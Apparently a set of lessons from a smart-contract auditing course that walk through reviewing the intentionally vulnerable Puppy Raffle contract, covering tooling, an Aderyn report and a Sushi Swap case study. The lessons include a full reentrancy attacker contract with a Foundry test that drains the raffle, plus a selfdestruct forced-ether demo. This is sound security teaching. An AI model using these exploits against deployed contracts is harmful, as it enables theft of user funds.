     - The file may be hidden - files prepended with `.` are often hidden. You can reveal all files in a directory with the command `ls -a`
     - The file may be elsewhere - navigate back in directories (`cd ..`) until you reach one that looks like this

     

     ...from here navigate to `usr/share/pandoc/data/templates`. In here you will find existing templates and this is where `eisvogel.latex` should be added.

2. **VS Code says I'm _unable to write a file to that directory_!**

   - This is related to your user permissions, we can force the file to be created with a sudo command. `sudo touch eisvogel.latex` - this command will create a file named `eisvogel.latex` in your current directory.
     - You may be prompted to enter your credentials or need to create an admin user.

3. **VS Code says I'm _unable to write to eisvogel.latex_!**

   - Similarly to above, this is permissions related. The easiest work around I found was through another `sudo` command.
     ```bash
     sudo tee eisvogel.latex << 'EOF'
     [copy LaTex here]
     EOF
     ```
   - The LaTex you need to copy is available [**here**](https://github.com/Cyfrin/audit-report-templating/blob/main/eisvogel.latex). Yes, you will be pasting 1068 lines into your terminal - this will overwrite your `eisvogel.latex` file, in your current directory, with that copied data.

4. **When I run `pandoc report.md -o ... etc` I get _File Not Found_**

   - This seems caused when our LaTex package is missing an important element. The easiest solution is to assure we have the full distribution of the package we're using. For WSL users `sudo apt install texlive-full` will resolve these errors.
     - Note: `texlive-full` is 5.6GB in size.

5. **When I run `pandoc report.md -o ... etc` I get _Missing number, treated as zero_**

   - Caused by an error in the LaTex syntax either in your markdown using it, or the template itself. Replace the block of LaTeX at the top of your `report.md` file with the following:

   ```
    \begin{titlepage}
    \centering
    {\Huge\bfseries Protocol Audit Report\par}
    \vspace{2cm}
    \begin{figure}[h]
    \centering
    \includegraphics[width=0.5\textwidth]{logo.pdf}
    \end{figure}
    \vspace{2cm}
    {\Large Version 1.0\par}
    \vspace{1cm}
    {\Large\itshape equious.eth\par}
    \vfill
    {\large \today\par}
    \end{titlepage}
   ```

   This should resolve the error.
---
title: Reporting - Findings We'll Cover Later
---

_Follow along with this video:_

---

The next time you search your `@Audit` tag, you may come across a note I briefly mentioned on an MEV vulnerability in Puppy Raffle's `refund` function.

```js
function refund(uint256 playerIndex) public {
    // @Audit: MEV
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    // slither-disable-next-line reentrancy-no-eth,reentrancy-events
    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
    }
```

We're actually going to skip this one for now. MEV's are something we'll return to later in the course to gain a deeper understanding of how they work.

For now, just mark this note as skipped and we'll continue to the next vulnerability.
---
title: Wrapping Up
---

_Follow along with this video:_

---

### Celebrate Your Wins

The very next thing you should do is post a tweet celebrating how far you've come and flexing how much you've learnt to the community.

![](https://cdn.videotap.com/IWZnrLvTfiL85XHWN2bU-13.04.png)

Go ahead and share your success on Twitter. There's no better way to share the news than a straightforward, cheerful tweet. If you're not sure how to compose your tweet, don't worry. I got you covered.

[**Clicking this will auto-generate a tweet for you to share your success!**](https://twitter.com/intent/tweet?text=I%20just%20completed%20the%20%40cyfrinaudits%20Puppy%20Raffle%20%F0%9F%90%B6%20Audit%20from%20the%20Ultimate%20Security%20Course.%0a%0aThanks%20%40patrickalphac!)

> "Celebrating your wins publicly not only helps you keep track of your progress but also encourages others to keep going."

### Farcaster: Web3 Social Media

You might also be interested in a more Web3 focused social media, if so I'd recommend checking out [Farcaster](https://www.farcaster.xyz/) to find like-minded researches and connect!

### CodeHawks First Flights

With two practice audits under your belt, I highly recommend participating in a [**CodeHawks First Flight**](https://www.codehawks.com/first-flights). These events are made specifically for someone like you, someone who wants to get their feet wet with easier/quicker competitive audits and gain some real experience.

.. If you're feeling really confident, you may even want to try a _real_ competitive audit!

Now's a great time to pause the course and participate in whichever First Flight is active, a new one starts every 2 weeks!

### Commend Yourself for The Milestone Achieved

Regardless of what you choose to do next, take a moment to pat yourself on the back. You've made it this far and it's no small feat. You've gotten a feel for what it's like to be a security researcher—diving into code bases, writing reports, looking for vulnerabilities, and spotting potential bugs based on past experiences.

Remember, in this field, repetition is the mother of skill. The more audits you carry out, the more skilled you will become.

```js
console.log(
  "Congratulations on getting this far! Now, go enjoy some ice cream."
);
```

Take that break, because in Section 5 the training wheels come off with `TSwap`, we're going to jump into Invariants, Fuzzing, Advanced DeFi and more.

Congratulations again, and I'll see you in Section 5!

🐸
---
title: Puppy Raffle Primer
---

_Follow along with this video:_

---

### Puppy Raffle Primer

Alright! Before we jump into this process I want to mention a couple things:

1. Do **not** look at the `audit-data` branch of the course [**repo.**](https://github.com/Cyfrin/4-puppy-raffle-audit). This is our `answer key`.

2. Take some time to scope the codebase yourself before proceeding. Try to go through the process we just did with PasswordStore and challenge yourself to find what you can here.

Don't spend _too much_ time trying things yourself. Spend 20-30 minutes doing your best and if you feel like you're getting nowhere, or you're unsure what to do - just stop. We can do it together.

If you feel like you're cooking and you've found a few bugs - keep going. Repeating this process and becoming comfortable with doing it yourself is an important part of learning.

Puppy Raffle is a phenomenal codebase to gain valuable security review experience on. So try your best on your own first, and when you're ready - let's move onto the Scoping phase together!
---
title: Info and Gas Findings
---

_Follow along with this video:_

---

### Info and Gas Findings

With all our questions answered, there still remain a few outstanding items we should consider.

We briefly ran Slither earlier in this section, but didn't look too closely at what its output was. We should definitely return to this. Additionally, as people who have gone through the Foundry course should recognize, this code base is not adhering to any design pattern best practices, and regularly chooses poor naming conventions.

Let's review a few recommendations we could make to improve the code for this protocol.

### Starting at the Top

The first thing we notice, at the very top of this repo are the naming conventions used for storage variables.



A convention I like to use for storage variables is the `s_variableName` convention! So this may be an informational finding we would want to submit.

Even further up the contract there's a bigger concern however.

```js
pragma solidity ^0.7.6
```

This statement is what's known as a `floating pragma`. It essentially denotes that the contract is compatible with solidity versions up to and including `0.7.6`. This brings a number of concerns including vulnerabilities across multiple versions, so best practice is to use a single version of solidity.

This would be a great informational finding to include in our report.

### Further Recommendations

Progressing down the code base, the next thing I notice are these statements:

```js
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
```

When raw numbers are used in a code body like this, we refer to them as `Magic Numbers`. They provide no context of what they're doing. Best practice would be to assign these to named constants.

```js
uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
uint256 public constant FEE_PERCENTAGE = 20;
uint256 public constant POOL_PRECISION = 100;

uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / POOL_PRECISION;
uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / POOL_PRECISION;
```

The last thing I'll point out is best verified through the project's `foundry.toml`. Here we can see the versions of the libraries being imported for the protocol.

A good practice will be to investigate the specific versions being used for reported issues and security advisories.

We can navigate to the OpenZeppelin security section [**here**](https://github.com/OpenZeppelin/openzeppelin-contracts/security).

This section of the OpenZepplin repo is kept updated with known security vulnerabilities within various versions of the OpenZeppelin library.

By clicking on one of the advisories, we get a detailed breakdown including the affected versions.



### Gas

In addition to informational findings in an audit, it can be optional to include gas recommendations for the protocol as well, though static analysis tools are getting really good at this and they're certainly becoming less common.

One example of such a suggestion in Puppy Raffle would be regarding `raffleDuration`. Currently this is a storage variable, but this never changes. Puppy Raffle could absolutely change this to be a `constant` or `immutable` variable to save substantial gas.
---
title: Solodit
---

_Follow along with this video:_

---

### Level Up Your Security Game with Solodit

Anybody who aims to excel in competitive audits and enhance their grasp of Web3 security should pay attention. The secret tool you need to get an edge? It's called [**Solodit**](https://solodit.xyz/).

The legendary [**Hans Friese**](https://twitter.com/hansfriese?lang=en) Was the #1 competitive auditor by earnings for the first half of 2023 with over $100,000 won.

When asked for advice on how he performs so well, he says one of the most beneficial things he does is reading the reports of other auditors.

Thus [**Solodit**](https://solodit.xyz/) was born. [**Solodit**](https://solodit.xyz/) aggregates publicly available security reports from across the industry into a single convenient aveneue to search and sort through.

Once logged in you should see something like this, a clean UI through which you can search and filter by anything you'd like.



By navigating to the [**`Audits` menu**](https://solodit.xyz/audit), we can even see live and upcoming audit competitions as well as learn about types of audits such as the Multi-Phase Audit.



In addition to this, Solodit aggregates open `bug bounties` as well as `leaderboard` positions across multiple auditing platforms.

There's even a notes section, to allow you to jot down your thoughts on your findings, or the findings of other people.

[**Solodit**](https://solodit.xyz/) truly is the `one-stop-shop` for security researchers.

### Wrap Up

Becoming a successful security researcher or a leading smart contract developer requires continuous learning. Solodit provides a unique platform that allows you to effortlessly learn, compete, and evolve as a professional in the sector. Consider it as your personal go-to learning and resource tool for staying abreast of industry developments. If you aspire to lead in the world of smart contract security, signing up for Solodit is a no-brainer.
---
title: Tooling - Solidity Visual Developer
---

_Follow along with this video:_

---

### Tools in our Belt

We've already got a handful of tools at our disposal.

- `Slither`
- `Aderyn`
- `CLOC`

We also went over `Solidity Metrics` earlier, but let's take another look as `Puppy Raffle` is going to afford us some more interesting insight into the power of this tool.

> Remember: you can right-click your `src` folder in the `Puppy Raffle` workspace and select `Solidity: Metrics` from the context menu to run the tool on that directory.

### Solidity Metrics Insights

Scrolling to the bottom of the `Solidity: Metrics` report, take a look at the `Inheritence Graph`



From this illustration we can see that the contract `PuppyRaffle` is of types `ERC721` and `Ownable`.

A little further down we see a `Call Graph`



This provides us a clear reference of which functions are being called by which other functions!

And finally `Solidity: Metrics` gives us a `Contract Summary`



This is incredibly valuable. It provides is a clear breakdown of `Internal` vs `External functions` as well as identifies which functions are `payable` and can `modify state`!

### Solidity Visual Developer

There's another tool I'll briefly mention - some developers swear by it. It's the extension [**Solidity Visual Developer**](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-visual-auditor) for VS Code.

In addition to providing very similar reporting as Solidity Metrics, the inheritence graph is interactive and it provides syntax highlighting in your code based on variable types.



Check it out if you feel it would be useful for adding some clarity to your development and security reviews!

Next we're going to dive deeper into the exciting world of static analysis tools. We'll take a closer look at the Solidity Metrics tool, which we introduced before, and also explore another tool known as Solidity Visual Developer.

### Wrap Up

Now that we've a firm grasp of our tooling options available, let's get started on this `Puppy Raffle` review. We're onto `Recon` - let's start with the documentation.
---
title: Mishandling of Eth - Minimized
---

_Follow along with this video:_

---

### Mishandling of Eth

To see this vulnerability in action we're going to again reference our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo!

There are two situational examples available for `Mishandling of Eth` for this lesson we want [**Remix (Vulnerable to selfdestruct)**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/mishandling-of-eth/SelfDestructMe.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js).

> Remember: The codebase is available on the [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/mishandling-of-eth/SelfDestructMe.sol) repo as well, if you want to test things locally.

### Remix Example

We've done this a few times, so we should be familiar with the process - go ahead and compile our `SelfDestructMe.sol` contract and deploy.

You'll likely be met with this message, `selfdestruct` is being heavily considered for deprecation, but for now this vulnerability still exists, so we can ignore this message for now.




SelfDestructMe.sol

```js
contract SelfDestructMe {
    uint256 public totalDeposits;
    mapping(address => uint256) public deposits;

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function withdraw() external {
        /*
            Apparently the only way to deposit ETH in the contract is via the `deposit` function.
            If that were the case, this strict equality would always hold.
            But anyone can deposit ETH via selfdestruct, or by setting this contract as the target
            of a beacon chain withdrawal.
            (see last paragraph of this section
            https://eth2book.info/capella/part2/deposits-withdrawals/withdrawal-processing/#performing-withdrawals),
            regardless of the contract not having a `receive` function.

            If anybody deposits ETH that way, then the equality breaks and the contract is DoS'd.
            To fix it, the code could be changed to >= instead of ==. Which means that the available
            ETH balance should be _at least_ `totalDeposits`, which makes more sense.
        */
        assert(address(this).balance == totalDeposits); // bad

        uint256 amount = deposits[msg.sender];
        totalDeposits -= amount;
        deposits[msg.sender] = 0;

        payable(msg.sender).transfer(amount);
    }
}
```




`SelfDestructMe.sol` is a fairly straightforward contract at a glance, experiment with the basic functions of the contract as you wish.

A user is able to deposit funds, which updates their balance as well as the `totalDeposits` variable. A user can also call `withdraw`, this function checks that the contract's balance is still equal to the `totalDeposits` and if so will updates balances and transfer funds.

I've deposited 1 Ether to the contract, here.



The issue comes from this line:

```js
assert(address(this).balance == totalDeposits);
```

The core of this vulnerability is the assumption that, without a `receive` or `fallback` function, the only way to send value to this contract is through the deposit function.

This is **_false_**.

Go ahead and deploy the `AttackSelfDestructMe.sol` contract. The constructor requires an attack target, so be sure to copy the address for `SelfDestructMe.sol` and pass it to your deploy. Give the contract a balance during deployment as well.



Now, when the attack function is called, `selfdestruct` will be triggered, and we expect to see our 5 Ether forced onto `SelfDestructMe.sol`.

And, that's exactly what we see:



Lastly, try calling the `withdraw` function on `SelfDestructMe.sol`. It reverts! The contract's accounting has been broken and it's balance is now stuck!



### Wrap Up

We've illustrated how relying on a contract's balance as a means of internal counting can be risky. There's really no way to be certain that arbitrary value isn't sent to a contract currenty.

As I'd mentioned previously, the concept of `Mishandling Eth` is a broad one. Our sc-exploits-minimized repo outlines another common scenario (push over pull) that I encourage you to look at, as we won't go over it here.

Ultimately, this is another finding for sure - let's make note of it.

```js
// @Audit: Mishandling Eth
function withdraw() external {...}
```
---
title: Reentrancy - PoC
---

_Follow along with this video:_

---

### Reentrancy in PuppyRaffle

Returning to PuppyRaffle, let's look at how all we've learnt affects this protocol.

A look again at this `refund` function and we see a classic case of reentrancy with an external call being made before updating state.

```js
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // @Audit: Reentrancy
    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

### The PoC

We can start by writing a new test in the protocol's `PuppyRaffle.t.sol` file. We'll have a bunch of players enter the raffle.

```js
function test_reentrancyRefund() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

}
```

> **Note:** There _is_ a `playersEntered` modifier we could use, included in this test suite, but we'll choose to be explicit here.

Next we'll create our `ReentrancyAttacker` Contract.

```js
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }
}
```

Once deployed, this `attack` function is going to kick off the attack. In order, we're entering the raffle, acquiring our `playerIndex`, and then refunding our `entranceFee`.

This is going to cause our entranceFee to be sent back to our contract ... what happens then?

```js
function _stealMoney() internal {
    if (address(puppyRaffle).balance >= entranceFee) {
        puppyRaffle.refund(attackerIndex);

    }
}

fallback() external payable {
    _stealMoney();
}

receive() external payable {
    _stealMoney();
}
```

Adding these functions to our `ReentrancyAttacker` contract finishes the job. When funds are sent back to our contract, the `fallback` or `receive` functions are called which is going to trigger another `refund` call in our `_stealMoney` function, completing the loop until the `PuppyRaffle` contract is drained!


 ReentrancyAttacker Contract 

```js
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);

        }
    }
    fallback() external payable {
        _stealMoney();
    }
    receive() external payable {
        _stealMoney();
    }
}
```




Alright, let's add this logic to our test. First we'll create an instance of the attacker contract and an attacker address, funding it with 1 ether.

```js
ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
address attacker = makeAddr("attacker");
vm.deal(attacker, 1 ether);
```

Next, we'll grab some balances so we're ablee to log our changes after the attack.

```js
uint256 startingAttackContractBalance = address(attackerContract).balance;
uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
```

We finally call the attack, like so:

```js
vm.prank(attacker);
attackerContract.attack{value: entranceFee}();
```

Then we'll console.log the impact:

```js
console.log("attackerContract balance: ", startingAttackContractBalance);
console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
console.log(
  "ending attackerContract balance: ",
  address(attackerContract).balance
);
console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
```


test_reentrancyRefund

```js
function test_reentrancyRefund() public {
    // users entering raffle
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    // create attack contract and user
    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);

    // noting starting balances
    uint256 startingAttackContractBalance = address(attackerContract).balance;
    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

    // attack
    vm.prank(attacker);
    attackerContract.attack{value: entranceFee}();

    // impact
    console.log("attackerContract balance: ", startingAttackContractBalance);
    console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
    console.log("ending attackerContract balance: ", address(attackerContract).balance);
    console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
}
```




All we need to do now is run this test with the command `forge test --mt test_reentrancyRefund -vvv` and we should receive...



### Wrap Up

We did it! We've proven the vulnerability through our application of our PoC and we'll absolutely be submitting this as a finding - likely a `High`.

Be very proud of what you've learnt so far, you're now armed to safeguard De-Fi against some of the most prevalent vulnerabilities in Web3.

Let's go back to the code back and continue our recon in the next lesson.
---
title: Integer Overflow - Mitigation
---

_Follow along with this video:_

---

### Mitigation

Integer over/underflow is actually fairly straightforward to mitigate against.

```js
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    uint256 winnerIndex =
        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    // @Audit: Newer version of Solidity, Bigger Uints
    totalFees = totalFees + uint64(fee);
```

In our `Puppy Raffle` protocol we would likely suggest a newer Solidity version. The use of a `uint64` is also just silly.

Foundry allows us to verify the max sizes of the numbers really conveniently through a `chisel` command. Typing `chisel` will start `chisel`, the command `type(uint64).max` will give an output like this:

```bash
Welcome to Chisel! Type `!help` to show available commands.
➜ type(uint64).max
Type: uint
├ Hex: 0x000000000000000000000000000000000000000000000000ffffffffffffffff
└ Decimal: 18446744073709551615
➜
```

_18 ETH due to having 18 decimal places_

If `Puppy Raffle` receives more than 18 ETH in fees, we're going to see overflow issues!

Experiment with `chisel` and try different `uint/int` types to get a sense for how big/small some of these common numbers are!
---
title: Recon Continued 3
---

_Follow along with this video:_

---

### Recon Continued

We're doing great so far and have uncovered lots - we definitely shouldn't stop now. The next function we'll approach is `changeFeeAddress`.

### changeFeeAddress

```js
/// @notice only the owner of the contract can change the feeAddress
/// @param newFeeAddress the new address to send fees to
function changeFeeAddress(address newFeeAddress) external onlyOwner {
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```

To begin with, let's look into the `changeFeeAddress` function. This function ensures that only the contract owner can make changes to the contract's `feeAddress`. The modifier `onlyOwner` that is used in this function is sourced from the OpenZeppelin library. We can (and should) inspect these functions to assure access control is working as we'd expect - it is.

```javascript
/**
 * @dev Throws if called by any account other than the owner.
 */
modifier onlyOwner() {
    require(owner() == _msgSender(), "Ownable: caller is not the owner");
    _;
}
```

`changeFeeAddress` then sets the `feeAddress` variable to the new address provided, and finally emits an event.

> Whoops! - events should be emitted after state changes, we haven't seen many events til now, we may need to return to previous functions to verify!

Things look fine with `changeFeeAddress`, what's next?

## \_isActivePlayer

```javascript
/// @notice this function will return true if the msg.sender is an active player
function _isActivePlayer() internal view returns (bool) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == msg.sender) {
            return true;
        }
    }
    return false;
}
```

Now, we haven't seen this referenced anywhere before now, we may want to simply investigate when this function is being used.



Ironically, it seems this function isn't being used anywhere in our protocol!

We would have to ask ourselves of course:

```js
// Impact:
// Likelihood:
```

Given that this is an `internal` function that is never called - the `impact` and `likelihood` are both realistically going to be `None`. With that said, this function is clearly a waste of gas.

When we complete our write up, it's likely this will be an `Informational` or `Gas` severity.

### \_baseURI

```js
/// @notice this could be a constant variable
function _baseURI() internal pure returns (string memory) {
    return "data:application/json;base64,";
}
```

The next function down is `_baseURI`. This seems pretty straightforward. It looks like it provides a base for a tokenURI used for an SVG NFT implementation.

> **Note:** If this is confusing to you, absolutely review the Foundry Full Course. NFTs are a huge part of DeFi and you _need_ to know this stuff intimately.

### tokenURI

Skimming through the `tokenURI` function, nothing initially sticks out as unusual. A few things we would want to check would be:

- Assuring tokens have their rarity properly assigned.
- Verifying mapping for `rarityToUri` and `rarityToName` and where they are set.
- Double checking that the image URIs work for each rarity.

The function then ends in a whole bunch of encoding stuff. It's pretty heavy, so we're not going to go through it too deeply. There may be some redundancy here - I challenge you to sus it out - but for the most part this is good.

Definitely be thinking about _how can I break this view function?_

### Wrap Up

At this point we've completed our first thorough review of the code base. We should definitely go back and reassess events, as well as dedicate some time considering state variables - but for the most part, we've completed an initial review!

This would be a great stage to go back through our notes and begin answering some of the questions we've been leaving ourselves.

```js
// Were custom reverts a thing in 0.7.6 of solidity?
// - No!
// What if the players.length == 0?
// - still emits an event when creating the raffle?
// etc...
```

We likely have a tonne of questions at this point and it's good practice to now answer them. Going through our previous questions might even generate new ones - but we keep at the process until we have a solid understanding of how everything should and does work.

Usually one pass of a code base isn't going to be enough. If there are unanswered questions, it's a good sign that you need to go deeper.

In the next lesson, we'll answer more of our questions, but I challenge you to go through some and try to find answers on your own before continuing!
---
title: Mishandling of Eth - Case Study
---

_Follow along with this video:_

---

### Case Study: Sushi Swap

In this lesson we'll be briefly detailing how the `Mishandling of Eth` vulnerability lead to catastrophic consequences in the case of Sushi Swap.

One of the best things you can do to grow your skills as a security researcher is to read case studies and familiarize yourself with hacks. We've included, in the [**course repo**](https://github.com/Cyfrin/security-and-auditing-full-course-s23), a link to [**an article**](https://samczsun.com/two-rights-might-make-a-wrong/) illustrating the case study we'll be going over briefly.

Now, the situation with Sushi Swap is different from what we've seen in other example, because again - `Mishandling of Eth` is a very broad category. Ultimately the issue was with this function:

```js
function batch(bytes[] calldata calls, bool revertOnFail) external payable returns (bool[] memory successes, bytes[] memory results) {
    successes = new bool[](calls.length);
    results = new bytes[](calls.length);
    for (uint256 i = 0; i < calls.length; i++) {
        (bool success, bytes memory result) = address(this).delegatecall(calls[i]);
        require(success || !revertOnFail, _getRevertMsg(result));
        successes[i] = success;
        results[i] = result;
    }
}
```

In the simplest terms, this function allows a user to compile multiple calls into a single transaction - sounds useful.

The oversight was in the use of `delegatecall`. When implementing delegatecall, msg.sender _and_ msg.value are persistant. This meant that a single value sent for one call in this function could be used for multiple calls!

> **For example:** If I were to call a function which cost 1 Eth, to call it 100 times, it should cost 100 Eth. In the case of the `batch` function, a user would be able to call the function 100 times, for only 1 Eth!

### Wrap Up

I highly encourage you to read through the provided article and familiarize yourself with the Sushi Swap case. Vulnerabilities when handling Eth without care come in many shapes and sizes. We've gone through a few examples in the last few lessons that I hope instill an understanding of the care that should be taken when dealing with funds.

In the next lesson we'll continue our Puppy Raffle Recon!
---
title: Tooling - Aderyn
---

_Follow along with this video:_

---

### Introducing Aderyn: A Rust Based Static Analysis Tool

The second powerful tool we'll be using in this course is a Rust-based analyzer, [**Aderyn**](https://github.com/Cyfrin/aderyn). This tool was created by the smart contract developer legend [**Alex Roan**](https://github.com/alexroan).

### Installation of Aderyn

Before we can use `Aderyn`, we'll need to first install `Rust`. Like `Slither`, we won't go over the specifics of installation, but you can find a guide with installation options available to you [**here**](https://www.rust-lang.org/tools/install).

> Remember: If you have issues with installation, AI is great at helping with this, you can also leverage the communities on Stack Overflow!

Once `Rust` has been installed, you can run the command `cargo install Aderyn`. This will install our tool.



> **Note:** If you've already installed Aderyn, this command will also update you to the current version. Your terminal will advise if the tool is already installed.

### Running Aderyn

To run Aderyn, the command is `Aderyn [OPTIONS] `. Since we're already in the root directory of our project, we can just run:

```bash
aderyn .
```

Running this command will compile our contracts, our terminal will display the usual compilation warnings - at the bottom of the output however, we can see _`Detectors run, printing report. Report printed to ./report.md`_

We should see this fine in our IDE explorer. If we open it up...


Puppy Raffle Aderyn Report

# Aderyn Analysis Report

This report was generated by [Aderyn](https://github.com/Cyfrin/aderyn), a static analysis tool built by [Cyfrin](https://cyfrin.io), a blockchain security company. This report is not a substitute for manual audit or security review. It should not be relied upon for any purpose other than to assist in the identification of potential security vulnerabilities.

# Table of Contents

- [Aderyn Analysis Report](#aderyn-analysis-report)
- [Table of Contents](#table-of-contents)
- [Summary](#summary)
  - [Files Summary](#files-summary)
  - [Files Details](#files-details)
  - [Issue Summary](#issue-summary)
- [Medium Issues](#medium-issues)
  - [M-1: Centralization Risk for trusted owners](#m-1-centralization-risk-for-trusted-owners)
- [Low Issues](#low-issues)
  - [L-1: `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`](#l-1-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256)
  - [L-2: Solidity pragma should be specific, not wide](#l-2-solidity-pragma-should-be-specific-not-wide)
  - [L-3: Conditional storage checks are not consistent](#l-3-conditional-storage-checks-are-not-consistent)
- [NC Issues](#nc-issues)
  - [NC-1: Missing checks for `address(0)` when assigning values to address state variables](#nc-1-missing-checks-for-address0-when-assigning-values-to-address-state-variables)
  - [NC-2: Functions not used internally could be marked external](#nc-2-functions-not-used-internally-could-be-marked-external)
  - [NC-3: Constants should be defined and used instead of literals](#nc-3-constants-should-be-defined-and-used-instead-of-literals)
  - [NC-4: Event is missing `indexed` fields](#nc-4-event-is-missing-indexed-fields)
    - [Wrap Up](#wrap-up)

# Summary

## Files Summary

| Key         | Value |
| ----------- | ----- |
| .sol Files  | 1     |
| Total nSLOC | 143   |

## Files Details

| Filepath            | nSLOC   |
| ------------------- | ------- |
| src/PuppyRaffle.sol | 143     |
| **Total**           | **143** |

## Issue Summary

| Category | No. of Issues |
| -------- | ------------- |
| Critical | 0             |
| High     | 0             |
| Medium   | 1             |
| Low      | 3             |
| NC       | 4             |

# Medium Issues

## M-1: Centralization Risk for trusted owners

Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

- Found in src/PuppyRaffle.sol [Line: 18](src/PuppyRaffle.sol#L18)

  ```solidity
  contract PuppyRaffle is ERC721, Ownable {
  ```

- Found in src/PuppyRaffle.sol [Line: 167](src/PuppyRaffle.sol#L167)

  ```solidity
      function changeFeeAddress(address newFeeAddress) external onlyOwner {
  ```

# Low Issues

## L-1: `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`

Use `abi.encode()` instead which will pad items to 32 bytes, which will [prevent hash collisions](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode) (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). Unless there is a compelling reason, `abi.encode` should be preferred. If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` [instead](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739).
If all arguments are strings and or bytes, `bytes.concat()` should be used instead.

- Found in src/PuppyRaffle.sol [Line: 197](src/PuppyRaffle.sol#L197)

  ```solidity
              abi.encodePacked(
  ```

- Found in src/PuppyRaffle.sol [Line: 201](src/PuppyRaffle.sol#L201)

  ```solidity
                          abi.encodePacked(
  ```

## L-2: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

  ```solidity
  pragma solidity ^0.7.6;
  ```

## L-3: Conditional storage checks are not consistent

When writing `require` or `if` conditionals that check storage values, it is important to be consistent to prevent off-by-one errors. There are instances found where the same storage variable is checked multiple times, but the conditionals are not consistent.

- Found in src/PuppyRaffle.sol [Line: 140](src/PuppyRaffle.sol#L140)

  ```solidity
          if (rarity <= COMMON_RARITY) {
  ```

- Found in src/PuppyRaffle.sol [Line: 142](src/PuppyRaffle.sol#L142)

  ```solidity
          } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
  ```

# NC Issues

## NC-1: Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 62](src/PuppyRaffle.sol#L62)

  ```solidity
          feeAddress = _feeAddress;
  ```

- Found in src/PuppyRaffle.sol [Line: 150](src/PuppyRaffle.sol#L150)

  ```solidity
          previousWinner = winner;
  ```

